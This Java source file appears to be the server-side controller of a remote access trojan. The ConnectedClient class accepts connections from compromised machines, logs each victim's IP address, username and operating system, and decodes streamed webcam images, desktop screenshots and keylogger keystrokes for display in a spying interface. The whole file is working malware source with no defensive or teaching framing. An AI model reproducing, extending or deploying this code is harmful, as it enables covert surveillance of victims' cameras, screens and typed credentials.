package me.sebsb;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.Base64;

import javax.imageio.ImageIO;

import me.sebsb.exception.ClientDisconnectedException;
import me.sebsb.gui.GuiDesktop;
import me.sebsb.gui.GuiKeyLogger;
import me.sebsb.gui.GuiText;
import me.sebsb.gui.GuiWebcam;
import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;
import me.sebsb.utils.Packet;

public class ConnectedClient{

	private PrintWriter pw;
	private BufferedReader br;
	private String lastIP;
	private String userName;
	private String os;
	
	// GUIs
	private GuiDesktop desktop;
	private GuiWebcam webcam;
	private GuiKeyLogger keylog;
	
	public ConnectedClient(Socket socket) throws IOException {
		this.lastIP = socket.getInetAddress().getHostAddress();
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					pw = new PrintWriter(socket.getOutputStream(), true);
					br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
					System.out.println("Connected client: " + socket.getRemoteSocketAddress());
					listen();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		}).start();
	}
	
	public void listen() {
		boolean disconnected = false;
		while (!disconnected) {
			try {
				String line = br.readLine();
				if (line == null) {
					throw new ClientDisconnectedException();
				}
				
				Packet packet = NetUtils.readPacket(line);
				if (packet.action == MessageType.GUI_TEXT.getID()) {
					new GuiText(packet.data);
				} else if (packet.action == MessageType.INFO.getID()) {
					this.os = packet.data.get(0);
					this.userName = packet.data.get(1);
					Server.getInstance().getGUI().updateInfo();
				} else if (packet.action == MessageType.WEBCAM.getID()) {
					if (webcam == null) {
						webcam = new GuiWebcam(this);
					}
					if (this.webcam.isActive()) {
						if (packet.data.get(0).equals("error")) {
							this.webcam.setNoWebcam();
							return;
						} else {
							byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
						    ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
						    BufferedImage i = ImageIO.read(bais);
							if (i != null) {
						        this.webcam.setImage(i);
							}
						}
					}
				} else if (packet.action == MessageType.DESKTOP.getID()) {
					if (desktop == null) {
						desktop = new GuiDesktop(this);
					}
					if (this.desktop.isActive()) {
						byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
					    ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
					    BufferedImage i = ImageIO.read(bais);
						if (i != null) {
					        this.desktop.setImage(i);
						}
					}
				} else if (packet.action == MessageType.KEYLOGGER.getID()) {
					if (keylog != null) {
						keylog.addKey(packet.data.get(0));
					}
				}
			} catch (ClientDisconnectedException e) {
				e.printStackTrace();
				Server.getInstance().removeClient(this);
				disconnected = true;
			} catch (SocketException e1 ) {
				disconnected = true;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		Server.getInstance().removeClient(this);
	}

	public void openDesktopView() {
		if (this.desktop == null) {
			this.desktop = new GuiDesktop(this);
		}
		this.desktop.setVisible(true);
	}
	
	public void openKeyLogView() {
		if (this.keylog == null) {
			this.keylog = new GuiKeyLogger(this);
		}
		this.keylog.setVisible(true);
	}
	
	public void openWebcamView() {
		if (this.webcam == null) {
			this.webcam = new GuiWebcam(this);
		}
		this.webcam.setVisible(true);
	}
	
	public PrintWriter getPrintWriter() {
		return this.pw;
	}
	
	public String getIP() {
		return this.lastIP;
	}
	
	public String getUsername() {
		return this.userName;
	}
	
	@Override
	public String toString() {
		return this.userName + " | " + this.os + " | " + this.getIP();
	}
}
